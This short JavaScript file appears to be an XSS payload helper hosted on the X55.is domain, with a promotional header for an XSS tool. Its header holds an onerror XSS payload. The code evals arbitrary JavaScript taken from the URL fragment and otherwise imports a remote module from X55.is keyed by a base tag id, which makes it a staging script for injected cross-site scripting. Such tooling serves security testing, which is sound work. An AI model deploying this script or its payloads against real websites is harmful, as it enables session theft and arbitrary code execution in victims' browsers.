/* =================================== !/

X55 is... Cross-Site Scripting!

Please check below on how to use this domain for XSS:

https://x.com/BRuteLogic/status/1488523712244637708
https://x.com/KN0X55/status/1903420962122449333

Copyright 2026 Brute Logic - All rights reserved.

Visit https://knoxss.pro for the best XSS tool out there.

<Img Src OnError = confirm(1)>

/! =================================== */

// URI:/1.js

if (document.location.hash) {
   var frag = document.location.hash.match(/[^#][^#]*/)[0];
}

if (frag) {

  try {

    eval(frag);

  } catch(e) {

    alert("URL fragment (#) contains invalid JS code, try again!");

  }

} else {

  if (document.getElementsByTagName('base')[0]) {
     var id = document.getElementsByTagName('base')[0].id;
  }

  if (id) {

     import('https://X55.is?1=' + id);

  } else {

     alert(1);

  }
}

// #hack2learn
